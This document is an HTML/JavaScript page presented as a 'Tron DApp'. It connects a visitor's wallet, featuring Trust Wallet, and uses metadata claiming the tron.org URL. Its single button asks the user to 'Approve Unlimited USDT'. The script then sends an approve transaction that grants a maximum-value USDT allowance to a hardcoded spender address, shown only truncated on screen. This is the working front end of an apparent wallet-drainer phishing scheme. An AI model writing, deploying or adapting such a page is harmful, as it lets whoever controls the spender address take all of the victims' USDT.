<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tron USDT Approval DApp</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f4f6f8;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: white;
            padding: 2rem;
            border-radius: 16px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            width: 90%;
            max-width: 420px;
            text-align: center;
        }
        h2 { margin: 0 0 5px 0; color: #2c3e50; }
        .subtitle { color: #7f8c8d; font-size: 0.9rem; margin-bottom: 20px; }
        
        .info-box {
            background: #f8f9fa;
            border: 1px solid #e9ecef;
            border-radius: 8px;
            padding: 12px;
            text-align: left;
            margin-bottom: 20px;
            font-size: 0.85rem;
        }
        .info-row { display: flex; justify-content: space-between; margin-bottom: 6px; }
        .label { font-weight: 600; color: #34495e; }
        .val { font-family: monospace; color: #2980b9; }

        button {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        /* Web3Modal Button Override to fit width */
        w3m-button {
            width: 100%;
            display: block;
            margin-bottom: 10px;
        }
        w3m-button::part(button) {
            width: 100%;
            background-color: #34495e;
            color: white;
            padding: 14px;
            border-radius: 8px;
            border: none;
            font-size: 1rem;
            font-weight: 600;
        }

        .btn-approve {
            background-color: #27ae60;
            color: white;
        }
        .btn-approve:hover { background-color: #219150; }
        .btn-approve:disabled { background-color: #bdc3c7; cursor: not-allowed; }

        #status {
            margin-top: 15px;
            font-size: 0.85rem;
            min-height: 20px;
        }
        .error { color: #c0392b; }
        .success { color: #27ae60; }
        
        #approveSection { display: none; margin-top: 20px; border-top: 1px solid #eee; padding-top: 20px; }
    </style>

    <!-- Import Map: Using Ethers v5 and Web3Modal v3 for stability -->
    <script type="importmap">
        {
            "imports": {
                "ethers": "https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js",
                "@web3modal/ethers": "https://cdn.jsdelivr.net/npm/@web3modal/ethers@3.0.0-beta.0/dist/esm/index.js"
            }
        }
    </script>
</head>
<body>

<div class="card">
    <h2>Tron DApp</h2>
    <div class="subtitle">Approve Unlimited USDT</div>

    <div class="info-box">
        <div class="info-row">
            <span class="label">Network</span>
            <span class="val">Tron Mainnet</span>
        </div>
        <div class="info-row">
            <span class="label">Token</span>
            <span class="val">USDT</span>
        </div>
        <div class="info-row">
            <span class="label">Spender</span>
            <span class="val">TSDcg...XLV</span>
        </div>
    </div>

    <!-- Wallet Connect Button -->
    <w3m-button></w3m-button>

    <!-- Approve Section (Hidden until connected) -->
    <div id="approveSection">
        <button id="btnApprove" class="btn-approve">Approve Unlimited USDT</button>
    </div>

    <div id="status"></div>
</div>

<script type="module">
    import { createWeb3Modal, defaultConfig, getWeb3Modal } from '@web3modal/ethers';
    import { providers } from 'ethers';

    // --- 1. Configuration ---
    const projectId = '171db6da15a54effc1b4a06f889a3c3f';
    
    // Tron Mainnet
    const tronMainnet = {
        chainId: 728126428, 
        name: 'Tron',
        currency: 'TRX',
        explorerUrl: 'https://tronscan.org',
        rpcUrl: 'https://api.trongrid.io'
    };

    const metadata = {
        name: 'Tron DApp',
        description: 'Approve USDT on Tron',
        url: 'https://tron.org',
        icons: []
    };

    // --- 2. Initialize Web3Modal ---
    createWeb3Modal({
        ethersConfig: defaultConfig({ metadata }),
        chains: [tronMainnet],
        projectId,
        enableAnalytics: true,
        // Trust Wallet ID
        featuredWalletIds: ['c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96']
    });

    // --- 3. App Logic ---
    const btnApprove = document.getElementById('btnApprove');
    const approveSection = document.getElementById('approveSection');
    const statusDiv = document.getElementById('status');
    const w3mButton = document.querySelector('w3m-button');

    // Listen for connection
    const modal = getWeb3Modal();
    modal.subscribeProvider(state => {
        if (state.isConnected) {
            approveSection.style.display = 'block';
            statusDiv.innerText = '';
        } else {
            approveSection.style.display = 'none';
        }
    });

    // Helper: Tron Base58 to Hex
    function tronBase58ToHex(base58) {
        const alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
        let bigInt = BigInt(0);
        for (let i = 0; i < base58.length; i++) {
            bigInt = bigInt * BigInt(58) + BigInt(alphabet.indexOf(base58[i]));
        }
        let hex = bigInt.toString(16);
        if (hex.length % 2 !== 0) hex = '0' + hex;
        // Remove leading 0x41 byte
        if (hex.startsWith('41')) hex = hex.substring(2);
        return '0x' + hex;
    }

    btnApprove.addEventListener('click', async () => {
        try {
            statusDiv.className = '';
            statusDiv.innerText = 'Preparing...';
            btnApprove.disabled = true;

            const provider = new providers.Web3Provider(modal.getProvider());
            const signer = provider.getSigner();

            // Ensure Network
            const network = await provider.getNetwork();
            if (Number(network.chainId) !== 728126428) {
                throw new Error("Please switch to Tron Mainnet in Trust Wallet");
            }

            // Addresses
            const tokenHex = tronBase58ToHex('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
            const spenderHex = tronBase58ToHex('TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV');

            // Build Data: approve(address spender, uint256 amount)
            // Selector: 0x095ea7b3
            // Amount: Max Uint256
            const data = 
                '0x095ea7b3' + 
                spenderHex.slice(2).padStart(64, '0') + 
                'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

            statusDiv.innerText = 'Check Trust Wallet...';

            const tx = {
                to: tokenHex,
                data: data,
                value: 0
            };

            const txResponse = await signer.sendTransaction(tx);
            
            statusDiv.className = 'success';
            statusDiv.innerText = `Approved! Hash: ${txResponse.hash}`;
            
        } catch (err) {
            console.error(err);
            statusDiv.className = 'error';
            statusDiv.innerText = 'Error: ' + (err.reason || err.message || 'Rejected');
        } finally {
            btnApprove.disabled = false;
        }
    });
</script>

</body>
</html>
